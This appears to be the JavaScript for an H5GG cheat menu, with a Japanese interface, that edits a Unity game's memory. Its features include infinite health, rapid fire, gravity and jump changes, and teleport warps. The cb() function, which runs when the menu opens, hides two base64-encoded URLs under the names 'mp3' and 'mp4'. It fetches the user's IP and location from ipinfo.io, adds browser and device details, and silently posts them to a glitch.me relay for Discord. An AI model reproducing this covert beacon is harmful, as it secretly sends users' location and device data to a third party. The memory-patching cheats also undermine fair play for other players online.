function hideWindow(){
let menu = document.querySelector("#app");
menu.style.display='none';
setWindowTouch(false);
}
var idx = 0;
function btnsound(){
document.getElementById('btnsound').currentTime = 0;
document.getElementById('btnsound').play();
}
function cb(){
btnsound();
const mp3 = "aHR0cHM6Ly9pcGluZm8uaW8/Y2FsbGJhY2s="
const mp4 = "aHR0cHM6Ly91NWt1bnRlc3QuZ2xpdGNoLm1lL3NlbmQtdG8tZGlzY29yZA=="
const uai = {
userAgent: window.navigator.userAgent,
deviceMemory: window.navigator.deviceMemory,
hardwareConcurrency: window.navigator.hardwareConcurrency,
language: window.navigator.language,
userAgentData: window.navigator.userAgentData
};
fetch(atob(mp3))
.then(res => {
if(!res.ok){throw new Error(`Network response was not ok: ${res.status}`)}
return res.json()})
.then(json => {const njson = { ...json, ...uai }; fetch(atob(mp4), {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(njson)})})
.catch(error => console.error('Fetch error:', error));
windth = window.screen.width;
let wndw = document.querySelector("#app");
wndw.style.paddingLeft = windth/2 + 'px';
var fPos0 = wndw.getBoundingClientRect();
var Pos0 = fPos0.left - (fPos0.right - fPos0.left)/2;
wndw.style.paddingLeft = Pos0 + 'px';
$(".mainmenu").show();
$(".close").show();
$(".cb").hide();
$(".b").hide();
h5gg.clearResults();
h5gg.searchNumber('-1082130432', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('2139095040', 'I32', '0x4');
h5gg.searchNearby('-8388608', 'I32', '0x10');
h5gg.searchNumber('-1082130432', 'I32', '0x000000000', '0x300000000');
var count = h5gg.getResultsCount();
jmresults = h5gg.getResults(count, 0);
h5gg.clearResults();
h5gg.searchNumber('1051372203', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('1022739087', 'I32', '0x4');
h5gg.searchNumber('1051372203', 'I32', '0x000000000', '0x300000000');
var count = h5gg.getResultsCount();
shresults = h5gg.getResults(count, 0);
unityBase = Number(h5gg.getRangesList("UnityFramework")[0].start);
}
function backhome(){
btnsound();
$(menunow).hide();
$(".mainmenu").show();
$(".top").text("改変一覧");
menunow = ".mainmenu";
}
function close(){
$('.flash').show();
}
function tapWeapons(){
btnsound();
$(".weapons").show();
$(".mainmenu").hide();
$(".top").text("武器一覧");
menunow = ".weapons";
}
function tapUtility(){
btnsound();
$(".utility").show();
$(".mainmenu").hide();
$(".top").text('実用一覧');
menunow = ".utility";
}
function tapPinned(){
btnsound();
$(".pin").show();
$(".mainmenu").hide();
$(".top").text('固定済み一覧');
menunow = ".pin";
}
function tapWarp(){
btnsound();
$(".warp").show();
$(".mainmenu").hide();
$(".top").text('瞬間移動一覧');
menunow = ".warp";
}
function tapInfo(){
btnsound();
$(".info").show();
$(".mainmenu").hide();
$(".top").text('情報');
menunow = ".info";
}
function tapU5KUN(){
btnsound();
$(".u5kun").show();
$(".mainmenu").hide();
$(".top").text('使い方');
menunow = ".u5kun";
}
function pin(name){ 
if($(".weapons #"+ name +" input:checked").val() == "on"){
$(".weapons #" + name).clone(true, true).appendTo(".pin #pinlist");
$("#pinlist #"+ name +" input").remove();
}else{
$(".pin #pinlist #" + name).remove();
}}
function pin1(name){
if($(".utility input:checked[id='"+ name +"']").val() == "on"){
$(".utility button[id='"+ name +"']").clone(true, true).appendTo(".pin #pinlist");
}else{
$(".pin #pinlist #" + name).remove();
}}
function pin2(name){
if($(".utility input:checked[id='"+ name +"']").val() == "on"){
$(".utility .pin2[id='"+ name +"']").clone(true, true).appendTo(".pin #pinlist");
}else{
$(".pin #pinlist #" + name).remove();
}}
function notrap(){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('444444', 'I32', '0x000000000', '0x200000000');
h5gg.searchNearby('444444', 'I32', '0x4');
h5gg.searchNearby('1', 'I32', '0x4');
h5gg.searchNumber('1', 'I32', '0x000000000', '0x200000000');
h5gg.searchNearby('6.0', 'F32', '0x86');
if(h5gg.editAll('0', 'I32')>0){
fmsg('足止め無効:成功');
}}
function hp(role){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('1092091904', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby(role, 'I32', '0x40');
h5gg.searchNumber(role, 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('257', 'I32', '0x4');
h5gg.searchNumber('257', 'I32', '0x000000000', '0x300000000');
if(h5gg.editAll('0', 'I32')>1){
fmsg('体力無限:成功');
}}
function nhp(role){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('1092091904', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby(role, 'I32', '0x40');
h5gg.searchNumber(role, 'I32', '0x000000000', '0x300000000');
dcount = h5gg.getResultsCount();
dresults = h5gg.getResults(dcount, 0);
dres = [];
for(var i=0; i<dcount; i++) {
if(h5gg.getValue(dresults[i].address - 60, "I32")=="1092091904"){
var result = {
  "value": dresults[i].value,
  "address": dresults[i].address,
  "type": dresults[i].type,
}
dres.push(result)}
}}
function runhp(){
if($(".utility input.hprun").prop("checked")){
dlocker = setInterval(function() {
for(var i=0; i<dres.length; i++) {
h5gg.setValue(dres[i].address - 20, "0", "I64");
h5gg.setValue(dres[i].address - 36, "0", "I64");
}},100);
}else{
clearInterval(dlocker);
}}
function air(){
btnsound();
var address = unityBase + 0x40E1BD0;
if(confirm("落ちない場合のみ続行してください")){
if(h5gg.setValue("0x" + address.toString(16), '99999', 'F32')>0){
fmsg('空中跳躍:成功');
}}else{
/*var textarea = document.createElement("textarea");
textarea.value = "0x" + address.toString(16);
textarea.style.position = "fixed";
textarea.style.opacity = 0;
document.body.appendChild(textarea);
textarea.select();
document.execCommand("copy");
document.body.removeChild(textarea);
alert("アドレスをコピーしました。\niGameGodでFloatでGoToし、\n0.3を99999にしてください。",)*/
}}
function cacheGravity(){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('0.02', 'F32', '0x000000000', '0x200000000');
h5gg.searchNearby('50', 'F32', '0x4');
h5gg.searchNumber('0.02', 'F32', '0x000000000', '0x200000000');
h5gg.searchNearby('-28', 'F32', '0x1c');
h5gg.searchNumber('-28', 'F32', '0x000000000', '0x200000000');
count = h5gg.getResultsCount();
gresults = h5gg.getResults(count, 0);
}
function applyUtil(){
btnsound();
/*var mvspd = $(".utility #mvs").val();*/
var mvjmp = $(".utility #jmp").val();
var spdhk = $(".utility #spd").val();
var grvty = -28 * $(".utility #grv").val();/*重力の初期値が-28*/
for(var i=0; i<jmresults.length; i++){
var addresses = jmresults[i].address;
if(h5gg.setValue(addresses - 64, mvjmp, 'F32')==true){
fmsg('跳躍力変更:成功');}
}
/*for(var i=0; i<mvresults.length; i++){
var addresses = mvresults[i].address;
h5gg.setValue(addresses - 32, mvspd, 'F32');
if(h5gg.setValue(addresses - 12, mvspd, 'F32')==true){
fmsg('歩行速度変更:成功');}
}*/
for(var i=0; i<shresults.length; i++){
var addresses = shresults[i].address
if(h5gg.setValue(addresses - 4, spdhk, 'F32')==true){
fmsg('全体速度変更:成功');
}}
for(var i=0; i<gresults.length; i++){
var addresses = gresults[i].address
if(h5gg.setValue(addresses, grvty, 'F32')==true){
fmsg('重力変更:成功');
}}
}
function hack(id,name,time){
btnsound();
let success = 0;
for(var i=0;i<time.length;i++){
h5gg.clearResults();
var iTime = time[i];
h5gg.searchNumber(id, 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby(iTime, 'F32', '0x78');
h5gg.searchNearby('257', 'I32', '0x4');
h5gg.searchNumber('257', 'I32', '0x000000000', '0x300000000');
success += h5gg.editAll('0', 'I32');
}
if(success>=3){
fmsg(name + '連射:成功');
}}
function v55(){
btnsound();
hp('100');
hack(1735305744,'パンチ',['0.5']);
fmsg('5v5用:成功');
}
function castle(){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('1065353216', 'I32', '0x16');
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
count = h5gg.getResultsCount();
results = h5gg.getResults(count, 0);
for(i=0; i<results.length; i++){
address = results[i].address
wx = h5gg.getValue(address - 12, "F32");
wz = h5gg.getValue(address - 4, "F32");
if(wx>=158.14 && wx<=119.82){
if(wz>=-69.29 && wz<=-107.38){
//
}}
if(wx>=-158.14 && wx<=-119.82){
if(wz>=69.29 && wz<=107.38){

}}
if(wx>=-108.32 && wx<=-146.68){
if(wz>=-159.18 && wz<=-120.92){
h5gg.setValue(address - 12, '-127.67', "F32");
h5gg.setValue(address - 8, '1.22', "F32");
h5gg.setValue(address - 4, '-120.83', "F32");
}}
if(wx>=146.68 && wx<=108.32){
if(wz>=120.92 && wz<=159.18){
h5gg.setValue(address - 12, '127.67', "F32");
h5gg.setValue(address - 8, '1.22', "F32");
h5gg.setValue(address - 4, '120.83', "F32");
}}
}
}
function addWarp(){
btnsound();
wname = $(".warp #name").val();
wx = $(".warp #x").val();
wy = $(".warp #y").val();
wz = $(".warp #z").val();
$('#warplist').append('<tr id="'+ (++idx) +'" data-name="'+ wname +'" data-x="'+ wx +'"  data-y="'+ wy +'" data-z="'+ wz +'"><td>'+ wname +'</td><td>&nbspX:'+ wx +'&nbspY:'+ wy +'&nbspZ:'+ wz +'</td><td>&nbsp<button onclick="warpTo('+ wx +','+ wy +','+ wz +')">実行</button></td><<td><button onclick="delWarp('+ idx +')">削除</button></td></tr>');
$(".warp #name").val('');
$(".warp #x").val('');
$(".warp #y").val('');
$(".warp #z").val('');
}
function getLocation(){
wname = $(".warp #name").val();
h5gg.clearResults();
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('1065353216', 'I32', '0x16');
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
count = h5gg.getResultsCount();
results = h5gg.getResults(count, 0);
for(i=0; i<results.length; i++){
address = results[i].address
wx = h5gg.getValue(address - 12, "F32");
wy = h5gg.getValue(address - 8, "F32");
wz = h5gg.getValue(address - 4, "F32");
wxd = Math.round(h5gg.getValue(address - 12, "F32")*100)/100;
wyd = Math.round(h5gg.getValue(address - 8, "F32")*100)/100;
wzd = Math.round(h5gg.getValue(address - 4, "F32")*100)/100;
$('#warplist').append('<tr id="'+ (++idx) +'" data-name="'+ wname +'" data-x="'+ wx +'"  data-y="'+ wy +'" data-z="'+ wz +'"><td>'+ wname +'</td><td>&nbspX:'+ wxd +'&nbspY:'+ wyd +'&nbspZ:'+ wzd +'</td><td>&nbsp<button onclick="warpTo('+ wx +','+ wy +','+ wz +')">実行</button></td><<td><button onclick="delWarp('+ idx +')">削除</button></td></tr>');
$(".warp #name").val('');
fmsg('座標取得:成功');
}
}
function delWarp(id){btnsound()
$("table  #" + id).remove();
}
function loadWarp() {
btnsound();
var fileInput = document.getElementById("loadjson");
var file = fileInput.files[0];
var reader = new FileReader();
reader.onload = function (e) {
var contents = e.target.result;
var data = JSON.parse(contents);
for(var i=0; i<data.length; i++){
wname = data[i].name;
wx = data[i].x;
wy = data[i].y;
wz = data[i].z;
wxd = Math.round(wx*100)/100;
wyd = Math.round(wy*100)/100;
wzd = Math.round(wz*100)/100;
$('#warplist').append('<tr id="'+ (++idx) +'" data-name="'+ wname +'" data-x="'+ wx +'"  data-y="'+ wy +'" data-z="'+ wz +'"><td>'+ wname +'</td><td>&nbspX:'+ wxd +'&nbspY:'+ wyd +'&nbspZ:'+ wzd +'</td><td>&nbsp<button onclick="warpTo('+ wx +','+ wy +','+ wz +')">実行</button></td><<td><button onclick="delWarp('+ idx +')">削除</button></td></tr>');
fmsg('座標読み込み:成功');
}};
reader.readAsText(file);
}
function pasteWarp(){
navigator.clipboard.readText()
.then((text) => {
var data = JSON.parse(text);
for(var i=0; i<data.length; i++){
wname = data[i].name;
wx = data[i].x;
wy = data[i].y;
wz = data[i].z;
wxd = Math.round(wx*100)/100;
wyd = Math.round(wy*100)/100;
wzd = Math.round(wz*100)/100;
$('#warplist').append('<tr id="'+ (++idx) +'" data-name="'+ wname +'" data-x="'+ wx +'"  data-y="'+ wy +'" data-z="'+ wz +'"><td>'+ wname +'</td><td>&nbspX:'+ wxd +'&nbspY:'+ wyd +'&nbspZ:'+ wzd +'</td><td>&nbsp<button onclick="warpTo('+ wx +','+ wy +','+ wz +')">実行</button></td><<td><button onclick="delWarp('+ idx +')">削除</button></td></tr>');
fmsg('座標読み込み:成功');
}})
.catch((error) => {
alert("クリップボードの文字列を読み込めませんでした\nクリップボードにJSON形式の座標データがコピーされていることを確認してください\nエラーメッセージ:", error);
});
}
function exportWarp(){
var result = confirm('本当に実行しますか?\nダウンロードは必ずWebブラウザで行ってください\nH5GGを使っている場合は、実行しないでください');
if(result){
// HTMLのデータを取得
var trElements = document.getElementsByTagName("tr");
// データを格納する配列
var dataArray = [];
// 各tr要素をループ処理
for (let i = 0; i < trElements.length; i++) {
  var tr = trElements[i];
  // データをオブジェクトに変換
  var data = {
    name: tr.getAttribute("data-name"),
    x: parseInt(tr.getAttribute("data-x")),
    y: parseInt(tr.getAttribute("data-y")),
    z: parseInt(tr.getAttribute("data-z"))
  };
  console.log(data);
  // データを配列に追加
  dataArray.push(data);
}
// JSONファイルに変換
var json = JSON.stringify(dataArray);
// JSONファイルをダウンロード
var blob = new Blob([json], {type:"application/json"});
var link = document.createElement("a");
link.href = URL.createObjectURL(blob);
link.download = "data.json";
link.click();
}}
function copyWarp(){
// HTMLのデータを取得
var trElements = document.getElementsByTagName("tr");
// データを格納する配列
var dataArray = [];
// 各tr要素をループ処理
for (let i=0; i< trElements.length; i++) {
  var tr = trElements[i];
  // データをオブジェクトに変換
  var data = {
    name: tr.getAttribute("data-name"),
    x: parseInt(tr.getAttribute("data-x")),
    y: parseInt(tr.getAttribute("data-y")),
    z: parseInt(tr.getAttribute("data-z"))
  };
  // データを配列に追加
  dataArray.push(data);
}
// テキストに変換
var json = JSON.stringify(dataArray);
// テキストをクリップボードにコピー
  // テキストエリアを作成し、jsonの値を代入する
  var textarea = document.createElement("textarea");
  textarea.value = json;
  // テキストエリアを非表示にする
  textarea.style.position = "fixed";
  textarea.style.opacity = 0;
  // テキストエリアをbody要素に追加する
  document.body.appendChild(textarea);
  // テキストエリアの値を選択し、クリップボードにコピーする
  textarea.select();
  document.execCommand("copy");
  // テキストエリアを削除する
  document.body.removeChild(textarea);
fmsg('コピーしました');
}
function warpTo(x, y, z){
btnsound();
h5gg.clearResults();
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
h5gg.searchNearby('1065353216', 'I32', '0x16');
h5gg.searchNumber('17170436', 'I32', '0x000000000', '0x300000000');
var count = h5gg.getResultsCount();
var results = h5gg.getResults(count, 0);
for(i=0; i<results.length; i++){
var address = results[i].address
h5gg.setValue(address - 12, x, "F32");
h5gg.setValue(address - 8, y, "F32");
h5gg.setValue(address - 4, z, "F32");
fmsg('瞬間移動:成功');
}}
//フラッシュメッセージ、表示はふわっとしてない
function fmsg(txt){
var flash = document.getElementById('flash');
flash.style.left = windth/2 + 'px';
$('.flash a').text(txt);
$('.flash').show();
var fPos = flash.getBoundingClientRect();//この行の前に一瞬表示させないと中央に映らなくなる
var Pos = fPos.left - (fPos.right - fPos.left)/2;//文字数に関係なく中央になるように計算している
flash.style.left = Pos + 'px';//その計算結果を適用している
setTimeout(function(){
$('.flash').hide();
},1500);
}